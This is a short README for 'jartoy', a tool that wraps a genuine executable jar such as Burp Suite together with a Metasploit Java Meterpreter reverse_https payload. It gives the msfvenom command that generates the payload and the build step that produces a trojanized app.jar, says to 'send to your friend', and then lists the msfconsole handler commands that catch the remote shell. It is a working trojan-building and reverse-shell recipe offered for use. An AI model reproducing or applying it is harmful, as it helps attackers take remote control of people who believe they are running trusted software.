## jartoy

This tool aims to encapsulate executable jars inside a single jar. 

1) Put burp jar (or another truthful) in
`app/src/main/resources/burp/core.jar`

2) Generate the poison jar 
```bash
# it assumes execution in the project directory
export SERVERADDR=1.2.3.4 # change 
export SERVERPORT=443
msfvenom -p java/meterpreter/reverse_https LHOST=$SERVERADDR LPORT=$SERVERPORT -f raw -o ./app/src/main/resources/net/blue.jar
```

3) Build the jar
```bash
# java 8 can generate a more compatible jar
./gradlew build
```

4) Get it in `./app/build/libs/app.jar` and send to your friend!

5) Run the port listener
```bash
sudo msfconsole 
use multi/handler
set PAYLOAD java/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT $SERVERPORT
set ExitOnSession 0
run -jz
```
